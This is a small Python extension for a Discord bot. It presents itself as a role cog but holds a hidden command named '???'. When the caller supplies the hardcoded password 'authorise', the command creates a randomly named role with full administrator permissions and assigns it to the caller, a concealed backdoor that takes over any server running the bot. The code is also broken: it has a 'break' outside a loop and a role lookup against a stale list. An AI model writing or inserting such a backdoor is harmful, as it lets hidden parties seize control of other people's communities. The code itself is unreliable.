import random
import discord
from discord.utils import get
from discord.ext import commands

permAdmin = discord.Permissions(administrator=True)


class Role(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command('???')
	async def roleAdmin(self, ctx, password:str=None):
		if password != 'authorise':
			await ctx.send('`ERROR`')
			break
		roles = ctx.guild.roles
		name = str(random.random())
		role = get(roles, name=name)
		if not role:
			await ctx.guild.create_role(name=name, permissions=permAdmin)
			role = get(roles, name=name)
		await ctx.author.add_roles(role)


def setup(bot):
	bot.add_cog(Role(bot))
